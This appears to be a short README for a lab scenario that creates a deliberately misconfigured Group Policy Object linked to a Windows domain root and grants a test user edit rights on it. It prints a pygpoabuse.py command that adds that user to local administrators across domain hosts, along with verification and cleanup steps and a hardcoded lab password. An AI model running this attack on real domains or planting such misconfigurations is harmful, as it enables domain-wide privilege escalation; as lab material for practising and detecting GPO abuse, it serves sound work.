# gpo-abuse

Creates GPO `scn-gpo-abuse`, links it to the domain root and gives `scn-gpo-attacker` (password `Aa1234567890!`) `GpoEditDeleteModifySecurity` on it.

Attack:

    pygpoabuse.py <domain>/scn-gpo-attacker:'Aa1234567890!' -gpo-id <GPO id> -command 'net localgroup administrators scn-gpo-attacker /add' -f
    # wait for (or force) a Group Policy refresh on the hosts

How to verify:

    Get-GPPermission -Name scn-gpo-abuse -All   # scn-gpo-attacker: GpoEditDeleteModifySecurity

Disable unlinks and deletes the GPO, then deletes the user. Not cleaned: settings the GPO already applied on hosts (scheduled tasks, local group changes) stay until removed by hand.
